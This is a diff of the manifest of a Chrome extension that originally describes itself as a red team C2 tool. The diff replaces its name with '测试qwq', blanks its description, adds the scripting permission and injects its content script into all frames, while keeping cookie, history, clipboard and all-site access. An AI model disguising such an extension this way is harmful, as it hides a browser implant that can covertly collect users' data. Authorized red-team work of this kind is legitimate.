@@ -1,6 +1,6 @@
 {
-  "name": "RedExt Extension",
-  "description": "A Chrome Extension for authorized Red Team C2 operations (Tailwind-based dark mode).",
+  "name": "测试qwq",
+  "description": " ",
   "version": "1.0",
   "manifest_version": 3,
   "permissions": [
@@ -11,7 +11,8 @@
     "clipboardWrite",
     "cookies",
     "history",
-    "bookmarks"
+    "bookmarks",
+    "scripting" 
   ],
   "host_permissions": [
     "<all_urls>"
@@ -23,7 +24,8 @@
     {
       "matches": ["<all_urls>"],
       "js": ["content_script.js"],
-      "run_at": "document_idle"
+      "run_at": "document_idle",
+      "all_frames": true
     }
   ],
   "action": {
